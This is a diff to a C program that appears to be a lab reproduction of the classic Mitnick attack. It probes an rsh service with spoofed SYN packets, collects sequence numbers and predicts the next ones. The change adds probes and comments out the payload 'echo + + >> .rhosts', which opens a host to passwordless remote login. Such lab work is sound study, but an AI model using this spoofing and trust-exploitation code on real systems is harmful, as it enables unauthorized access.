@@ -181,11 +181,12 @@ int main (void)
 	}
 
 	//probe xterminal
-	tcp_seq seq_array[5]; //actually I onlly need 2
+	tcp_seq seq_array[10]; //actually I onlly need 2
 
 	printf("Starting probing\n");
-	for (i = 0; i < 5; i++)
+	for (i = 0; i < 10; i++)
 	{
+		printf("probe\n");
 		//send syn packets to shell in xterm, with kevin ip, to read the real synack and compute next sequence number
 		send_syn(514, NULL, 0, l, xterm_ip, kevin_ip);
 		packet = pcap_next(handle, &header);
@@ -195,7 +196,7 @@ int main (void)
 
 		tcp_seq seq = htonl(tcp_hdr->th_seq);
 		tcp_seq ack = htonl(tcp_hdr->th_ack);
-
+		usleep(1000);
 		printf("seq %u, ack %u\n", seq, ack);
 		seq_array[i] = seq;
 
@@ -205,15 +206,19 @@ int main (void)
 
 	//compute nextseq
 	printf("predictions\n");
-	printf("%u", compute_next_seq(seq_array[0], seq_array[1]));
-	printf("%u", compute_next_seq(seq_array[1], seq_array[2]));
-	printf("%u", compute_next_seq(seq_array[2], seq_array[3]));
-	printf("%u", compute_next_seq(seq_array[3], seq_array[4]));
+	printf("%u\n", compute_next_seq(seq_array[0], seq_array[1]));
+	printf("%u\n", compute_next_seq(seq_array[1], seq_array[2]));
+	printf("%u\n", compute_next_seq(seq_array[2], seq_array[3]));
+	printf("%u\n", compute_next_seq(seq_array[3], seq_array[4]));
+        printf("%u\n", compute_next_seq(seq_array[4], seq_array[5]));
+        printf("%u\n", compute_next_seq(seq_array[5], seq_array[6]));
+        printf("%u\n", compute_next_seq(seq_array[6], seq_array[7]));
+        printf("%u\n", compute_next_seq(seq_array[7], seq_array[8]));
 
 
 	//exploit trust relation
-	char username[] = "tsumotsu";
-	char command[] = "echo + + >> .rhosts";
+	//char username[] = "tsumotsu";
+	//char command[] = "echo + + >> .rhosts";
 
 
 	//send syn impersonating the server
